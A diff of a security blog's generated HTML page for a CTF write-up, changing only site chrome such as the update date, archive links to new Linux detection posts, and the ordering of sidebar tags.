 <p>其中在最后给出了个很好的建议：STOP USING PERL 🤣</p>
 
     </article>
@@ -464,7 +481,7 @@ height:40vh;
         <div class="license-wrapper">
             <p>原文链接：<a href="http://onils.github.io/2017/12/17/Pwnhub-returns-and-SqlSRF-WP/">http://onils.github.io/2017/12/17/Pwnhub-returns-and-SqlSRF-WP/</a>
             </p><p>发表日期：<a href="http://onils.github.io/2017/12/17/Pwnhub-returns-and-SqlSRF-WP/">December 17th 2017, 12:00:00 am</a>
-            </p><p>更新日期：<a href="http://onils.github.io/2017/12/17/Pwnhub-returns-and-SqlSRF-WP/">May 4th 2020, 2:41:29 am</a>
+            </p><p>更新日期：<a href="http://onils.github.io/2017/12/17/Pwnhub-returns-and-SqlSRF-WP/">June 2nd 2020, 7:05:36 pm</a>
             </p><p>版权声明：<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International (CC BY-NC 4.0)</a></p>
         </div>
     
@@ -692,9 +709,27 @@ top:40vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 8
+        Total : 10
         </div>
         <!-- search  -->
         
@@ -707,6 +742,16 @@ top:40vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span><a class="archive-post-title" href="/2020/06/05/Linux-Compromise-Detection-Command-Cheatsheet/">Linux Compromise Detection Command Cheatsheet</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span><a class="archive-post-title" href="/2020/06/05/Detecting-Linux-Kernel-Process-Masquerading/">Detecting Linux Kernel Process Masquerading</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -729,7 +774,7 @@ top:40vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/Linux-Security/">Linux Binary Security</a>
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/Linux-Binary-Security/">Linux Binary Security</a>
         </li>
     
     
@@ -780,17 +825,11 @@ top:40vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="book"><span class="iconfont-archer">&#xe606;</span>book</span>
-    
         <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
     
         <span class="sidebar-tag-name" data-tags="LD_PRELOAD"><span class="iconfont-archer">&#xe606;</span>LD_PRELOAD</span>
     
-        <span class="sidebar-tag-name" data-tags="Binary"><span class="iconfont-archer">&#xe606;</span>Binary</span>
-    
-        <span class="sidebar-tag-name" data-tags="ELF"><span class="iconfont-archer">&#xe606;</span>ELF</span>
-    
-        <span class="sidebar-tag-name" data-tags="Reversing"><span class="iconfont-archer">&#xe606;</span>Reversing</span>
+        <span class="sidebar-tag-name" data-tags="rootkit"><span class="iconfont-archer">&#xe606;</span>rootkit</span>
     
         <span class="sidebar-tag-name" data-tags="ML"><span class="iconfont-archer">&#xe606;</span>ML</span>
     
@@ -800,17 +839,27 @@ top:40vh;
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
+        <span class="sidebar-tag-name" data-tags="Binary"><span class="iconfont-archer">&#xe606;</span>Binary</span>
+    
+        <span class="sidebar-tag-name" data-tags="ELF"><span class="iconfont-archer">&#xe606;</span>ELF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reversing"><span class="iconfont-archer">&#xe606;</span>Reversing</span>
+    
         <span class="sidebar-tag-name" data-tags="backdoor"><span class="iconfont-archer">&#xe606;</span>backdoor</span>
     
-        <span class="sidebar-tag-name" data-tags="pam"><span class="iconfont-archer">&#xe606;</span>pam</span>
-    
-        <span class="sidebar-tag-name" data-tags="audit"><span class="iconfont-archer">&#xe606;</span>audit</span>
-    
-        <span class="sidebar-tag-name" data-tags="golang"><span class="iconfont-archer">&#xe606;</span>golang</span>
+        <span class="sidebar-tag-name" data-tags="detection"><span class="iconfont-archer">&#xe606;</span>detection</span>
     
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="Perl"><span class="iconfont-archer">&#xe606;</span>Perl</span>
+    
+        <span class="sidebar-tag-name" data-tags="pam"><span class="iconfont-archer">&#xe606;</span>pam</span>
+    
+        <span class="sidebar-tag-name" data-tags="book"><span class="iconfont-archer">&#xe606;</span>book</span>
+    
+        <span class="sidebar-tag-name" data-tags="audit"><span class="iconfont-archer">&#xe606;</span>audit</span>
+    
+        <span class="sidebar-tag-name" data-tags="golang"><span class="iconfont-archer">&#xe606;</span>golang</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -844,6 +893,8 @@ jsonContent:
 </div>
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
